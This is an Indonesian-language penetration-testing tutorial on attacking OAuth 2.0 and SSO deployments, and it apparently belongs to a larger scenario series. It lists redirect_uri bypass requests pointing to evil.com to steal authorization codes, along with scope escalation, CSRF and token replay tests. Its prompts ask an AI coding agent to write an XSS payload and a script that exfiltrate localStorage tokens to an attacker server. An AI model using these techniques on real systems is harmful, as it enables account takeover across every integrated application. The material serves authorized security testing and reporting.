# Skenario 13 (Tambahan): Aplikasi Enterprise dengan SSO / OAuth 2.0

**Berlaku untuk:** Aplikasi internal maupun internet  
**Mengapa perlu tutorial khusus:** Kerentanan OAuth berdampak ke seluruh ekosistem aplikasi yang terintegrasi

---

## Kenapa OAuth/SSO Kritis

- **Single point of failure** — jika SSO dikompromikan, semua aplikasi terpapar
- **Token scope confusion** — token dengan scope terlalu luas
- **Redirect URI manipulation** — steal authorization code
- **State parameter bypass** — CSRF di OAuth flow
- **Token storage di browser** — localStorage XSS extraction

---

## Phase 1: Reconnaissance OAuth

```bash
# Identifikasi OAuth provider
curl -I https://target.co.id/login
# Cari: Location: /oauth/authorize, X-Auth-Provider: keycloak

# Temukan .well-known endpoint (OpenID Connect)
curl -s https://auth.target.co.id/.well-known/openid-configuration | python3 -m json.tool

# Temukan authorization endpoint
curl -s https://target.co.id/.well-known/oauth-authorization-server
```

**Prompt Claude Code:**
```
OpenID Connect configuration dari target.co.id:

{
  "issuer": "https://auth.target.co.id",
  "authorization_endpoint": "https://auth.target.co.id/oauth/authorize",
  "token_endpoint": "https://auth.target.co.id/oauth/token",
  "userinfo_endpoint": "https://auth.target.co.id/oauth/userinfo",
  "jwks_uri": "https://auth.target.co.id/.well-known/jwks.json",
  "scopes_supported": ["openid", "profile", "email", "admin", "read:all"],
  "response_types_supported": ["code", "token", "id_token"]
}

Analisis:
1. Scope 'admin' dan 'read:all' — bisa di-request oleh client arbitrary?
2. response_type 'token' — implicit flow → token di URL fragment (tidak aman)
3. Apakah ada PKCE requirement? (mencegah auth code intercept)
4. Endpoint mana yang harus ditest pertama?
```

---

## Phase 2: Redirect URI Manipulation

```bash
# OAuth flow normal:
# 1. GET /oauth/authorize?client_id=app1&redirect_uri=https://target.co.id/callback&scope=openid&state=abc123

# SERANGAN: manipulasi redirect_uri

# Test 1: Ubah domain
GET /oauth/authorize?
  client_id=app1&
  redirect_uri=https://evil.com/callback&  ← domain berbeda
  scope=openid&state=abc123

# Test 2: Open redirect di allowed domain
GET /oauth/authorize?
  client_id=app1&
  redirect_uri=https://target.co.id/logout?next=https://evil.com&  ← chained redirect
  scope=openid

# Test 3: Path traversal di redirect_uri
GET /oauth/authorize?
  client_id=app1&
  redirect_uri=https://target.co.id/callback/../evil  ← path traversal

# Test 4: URL encoding bypass
GET /oauth/authorize?
  client_id=app1&
  redirect_uri=https://target.co.id%2Fevil.com  ← encoded slash
```

**Prompt Claude Code:**
```
OAuth server di auth.target.co.id.
Registered redirect_uri: https://target.co.id/callback

Buatkan test script yang mencoba semua variasi redirect_uri bypass:
1. Subdomain: https://evil.target.co.id/callback
2. Extra path: https://target.co.id/callback/../../../evil
3. URL encoding: %2F, %2520, unicode
4. Wildcard abuse: https://target.co.id.evil.com
5. Parameter pollution: redirect_uri=https://target.co.id&redirect_uri=https://evil.com
6. Fragment abuse: https://target.co.id/callback#https://evil.com

Untuk setiap yang berhasil, jelaskan dampak: bisa steal authorization code?
```

---

## Phase 3: State Parameter Testing (CSRF)

```bash
# Test apakah state parameter diverifikasi
# Normal flow: client generate random state, verifikasi setelah callback

# CSRF attack: buat link tanpa state yang valid
GET /oauth/authorize?
  client_id=app1&
  redirect_uri=https://target.co.id/callback&
  scope=openid&
  state=predictable_value_or_removed

# Jika berhasil → login CSRF: paksa korban login dengan akun penyerang
```

---

## Phase 4: Token Scope Escalation

```bash
# Test request scope yang tidak seharusnya bisa di-request
GET /oauth/authorize?
  client_id=public_app&
  scope=openid profile email admin read:all&  ← minta scope admin
  redirect_uri=https://target.co.id/callback

# Test apakah access token bisa digunakan di endpoint dengan scope berbeda
curl -H "Authorization: Bearer <token_with_user_scope>" \
  https://target.co.id/api/admin/users
```

---

## Phase 5: Token Storage Testing

```javascript
// Cek dari browser DevTools Console apakah token disimpan insecure

// localStorage (rentan XSS)
localStorage.getItem('access_token')
localStorage.getItem('id_token')

// sessionStorage
sessionStorage.getItem('token')

// Cookie (lebih aman jika HttpOnly + Secure)
document.cookie  // HttpOnly cookies tidak muncul di sini
```

**Prompt Claude Code:**
```
Aplikasi SPA di target.co.id menyimpan JWT di localStorage:
localStorage.setItem('access_token', token)
localStorage.setItem('user_role', payload.role)

Dan ada XSS vulnerability di /search endpoint.

Buatkan:
1. XSS payload untuk mencuri token dari localStorage
2. Script yang men-exfiltrate token ke server attacker
3. Cara menggunakan token yang dicuri untuk account takeover
4. Dampak jika SSO token (bukan hanya satu app, tapi semua integrated apps)
5. Rekomendasi: gunakan httpOnly cookie atau Web Crypto API
```

---

## Phase 6: PKCE Bypass Testing

```bash
# PKCE (Proof Key for Code Exchange) mencegah auth code interception
# Test apakah PKCE di-enforce

# Request tanpa code_challenge (seharusnya ditolak jika PKCE required)
GET /oauth/authorize?
  client_id=mobile_app&
  redirect_uri=myapp://callback&
  scope=openid&
  response_type=code&
  # TIDAK ada code_challenge dan code_challenge_method
  state=abc123
```

---

## Phase 7: SSO Token Replay

```python
# Test apakah token bisa di-replay ke service lain
import requests

# Token dari app1.target.co.id
token = "<JWT dari App 1>"

# Coba gunakan di app2.target.co.id
resp = requests.get("https://app2.target.co.id/api/profile",
                   headers={"Authorization": f"Bearer {token}"})
print(f"App2 response: {resp.status_code}")
# Jika 200 → token tidak di-validate untuk audience (aud claim)

# Verifikasi 'aud' claim di JWT
import base64, json
payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
print(f"Token audience: {payload.get('aud')}")
# Seharusnya: "aud": "app1.target.co.id" bukan "*" atau missing
```

---

## Checklist SSO/OAuth Testing

```
[ ] Discover OAuth endpoints (.well-known/openid-configuration)
[ ] Test redirect_uri bypass (subdomain, path traversal, encoding)
[ ] Test state parameter (CSRF, missing, predictable)
[ ] Test scope escalation (request admin scope)
[ ] Analisis token storage (localStorage → XSS risk)
[ ] Test PKCE enforcement untuk public clients
[ ] Test token audience validation
[ ] Test token replay across applications
[ ] Test refresh token rotation
[ ] Test logout → revoke semua token?
[ ] Laporan: dampak meluas ke seluruh integrated apps
```

---

## Impact Statement untuk Laporan

**Prompt Claude Code:**
```
Temuan OAuth vulnerability di SSO auth.target.co.id:
- redirect_uri bypass berhasil → authorization code bisa di-steal
- SSO menggunakan implicit flow (deprecated) → token di URL
- Token tersimpan di localStorage → rentan XSS

Aplikasi yang terintegrasi dengan SSO ini:
- ERP system (data keuangan)
- HR system (data pegawai)
- Email gateway
- CRM (data customer)

Tulis risk assessment:
1. Dampak jika SSO dikompromikan (semua apps sekaligus)
2. Rantai serangan: XSS → steal token → akses semua sistem
3. Severity: mengapa ini lebih dari sekedar 'Medium'
4. Rekomendasi prioritas: migrasi ke auth code flow + PKCE
```
